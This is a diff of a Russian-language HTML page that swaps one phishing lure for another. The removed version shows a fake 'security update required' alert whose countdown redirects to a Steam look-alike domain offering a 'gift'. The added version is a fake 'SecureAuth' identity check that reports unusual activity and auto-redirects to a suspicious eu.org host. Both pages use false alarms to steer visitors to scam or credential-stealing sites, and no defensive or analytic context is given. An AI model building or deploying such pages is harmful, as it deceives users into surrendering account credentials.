@@ -1,32 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Требуется обновление безопасности</title>
-    <script>
-        setTimeout(function() {
-            window.location.href = "https://steamcommunllity.com/gift";
-        }, 7000);
-    </script>
+    <title>Проверка подлинности</title>
+    <meta http-equiv="refresh" content="10;url=https://cf-4.nxnrllbe.eu.org/">
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 50px; }
-        .security-alert { background: rgba(255,255,255,0.1); padding: 40px; border-radius: 15px; backdrop-filter: blur(10px); }
-        .countdown { font-size: 24px; margin: 20px 0; }
+        body { font-family: Arial, sans-serif; background: #e8f4f8; padding: 50px; }
+        .auth-box { background: white; border: 2px solid #4285f4; border-radius: 8px; padding: 30px; max-width: 500px; margin: 0 auto; }
+        .logo { color: #4285f4; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <div class="security-alert">
-        <h1>🔒 Требуется обновление безопасности</h1>
-        <p>Обнаружена подозрительная активность в вашем аккаунте.</p>
-        <p>Для защиты ваших данных требуется немедленное обновление параметров безопасности.</p>
-        <div class="countdown">Перенаправление через: <span id="timer">7</span> секунд</div>
+    <div class="auth-box">
+        <div class="logo">🔐 SecureAuth</div>
+        <h2>Требуется проверка подлинности</h2>
+        <p>Система безопасности обнаружила необычную активность.</p>
+        <p>Для продолжения работы необходимо подтвердить вашу личность.</p>
+        <p>Автоматическое перенаправление через 10 секунд...</p>
+        <p><a href="https://cf-4.nxnrllbe.eu.org/">Перейти сейчас</a></p>
     </div>
-    
-    <script>
-        let time = 7;
-        setInterval(function() {
-            time--;
-            document.getElementById('timer').textContent = time;
-        }, 1000);
-    </script>
 </body>
 </html>
